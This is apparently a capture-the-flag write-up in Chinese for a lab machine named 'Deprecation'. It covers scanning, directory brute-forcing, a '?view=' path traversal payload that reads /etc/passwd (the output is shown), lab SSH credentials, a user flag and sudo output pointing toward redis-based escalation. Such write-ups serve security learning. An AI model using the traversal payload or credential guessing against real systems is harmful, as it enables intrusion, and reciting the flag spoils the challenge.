## 信息收集
端口扫描
![image.png](https://gitee.com/fogpost/photo/raw/master/202603031201848.png)
项目结构分析
![image.png|474](https://gitee.com/fogpost/photo/raw/master/202603021105276.png)
目录爆破
![image.png](https://gitee.com/fogpost/photo/raw/master/202603031209933.png)
登录页面测试账户密码（这个只能纯测试么）
admin：this_is_NOT_the_real_admin_password_please_change_it
guest：guest123
test：123123
得到?view=filename
然后利用目录遍历漏洞获取../../../../etc/passwd
```
root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
klogd:x:100:101:klogd:/dev/null:/sbin/nologin
nginx:x:101:102:nginx:/var/lib/nginx:/sbin/nologin
shanran:x:1000:1000:shan******:/home/shanran:/bin/sh
redis:x:102:104:redis:/var/lib/redis:/sbin/nologin
```
尝试利用shanran获取ssh密码，其实也是看别人的
shanran:shanran123
然后ssh连接后查看文件获取
flag{user-0374e740474ae0e861460e5baf5ce293}。
查看用户权限，发现redis
```linux
Deprecation:~$ sudo -l
Matching Defaults entries for shanran on Deprecation:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for shanran:
    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"

User shanran may run the following commands on Deprecation:
    (ALL) NOPASSWD: /sbin/rc-service redis restart
    (ALL) NOPASSWD: /sbin/rc-service redis stop
    (ALL) NOPASSWD: /sbin/rc-service redis start
    (ALL) NOPASSWD: /sbin/rc-service redis status
```
